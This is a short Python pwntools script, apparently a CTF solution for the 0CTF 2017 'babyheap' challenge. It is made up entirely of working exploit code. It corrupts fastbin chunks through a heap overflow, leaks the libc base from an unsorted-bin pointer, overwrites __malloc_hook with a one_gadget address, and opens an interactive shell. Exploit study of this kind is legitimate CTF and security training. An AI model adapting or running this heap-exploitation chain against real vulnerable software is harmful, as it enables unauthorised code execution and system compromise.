from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')
p = process('./babyheap_0ctf_2017')

def alloc(size):
    p.sendline('1')
    p.sendlineafter(': ', str(size))
    p.recvuntil(': ', timeout=1)

def fill(idx, data):
    p.sendline('2')
    p.sendlineafter(': ', str(idx))
    p.sendlineafter(': ', str(len(data)))
    p.sendafter(': ', data)
    p.recvuntil(': ')

def free(idx):
    p.sendline('3')
    p.sendlineafter(': ', str(idx))
    p.recvuntil(': ')

def dump(idx):
    p.sendline('4')
    p.sendlineafter(': ', str(idx))
    p.recvuntil(': \n')
    data = p.recvline()
    p.recvuntil(': ')
    return data


for i in range(4):
	alloc(0x10) # a0,b1,c2,d3
alloc(0x80) # e4
free(1) # b
free(2) # c

# c->fd = e
payload = flat([0,0,0,0x21,0,0,0,0x21,'\x80'])
fill(0, payload)

# e->chunk_size = 0x21
payload = flat([0,0,0,0x21])
fill(3, payload)

alloc(0x10) # c1
alloc(0x10) # e2

# e->chunk_size = 0x91
payload = flat([0,0,0,0x91])
fill(3, payload)
alloc(0x80) # f5
free(4) # e, e->fd = unsorted_head

base = u64(dump(2)[:8])-0x3c4b78
log.info("libc_base: " + hex(base))

alloc(0x60) # g4
free(4) # g

# g->fd = _IO()
payload = p64(base+0x3c4aed)
fill(2, payload)

alloc(0x60) # g5
alloc(0x60) # _IO()6

# _IO() + 0x13 == __malloc_hook(), one_gadget
payload = flat(['\x00'*0x13,p64(base+0x4526a)])
fill(6, payload)

# malloc() -> __malloc_hook()
alloc(1)

p.interactive()